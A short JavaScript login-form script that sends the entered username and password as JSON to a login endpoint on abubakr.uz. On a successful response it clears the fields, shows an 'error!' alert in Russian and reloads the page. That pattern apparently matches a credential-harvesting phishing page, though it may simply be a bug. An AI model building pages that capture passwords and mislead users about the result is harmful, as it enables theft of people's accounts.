const input_username = document.querySelector('.input_username')
const input_password = document.querySelector('.input_password')
const btn = document.querySelector('.btn')

btn.onclick = async () => {
    input_username.style.borderColor = '#efefef'
    input_password.style.borderColor = '#efefef'
    if(!input_username.value){
        input_username.style.borderColor = 'red'
    } else if (!input_password.value){
        input_password.style.borderColor = 'red'
    } else {
        const res = await fetch('https://abubakr.uz:4001/login', {
            method: "POST",
            headers: {
                'Content-type': 'application/json'
            },
            body: JSON.stringify({
                username: input_username.value,
                password: input_password.value
            })
        })
        
        const data = await res.json()
        if(data.status == 200){
            input_username.value = ''
            input_password.value = ''
            alert('ошибка !')
            location.reload()
        }
    }
}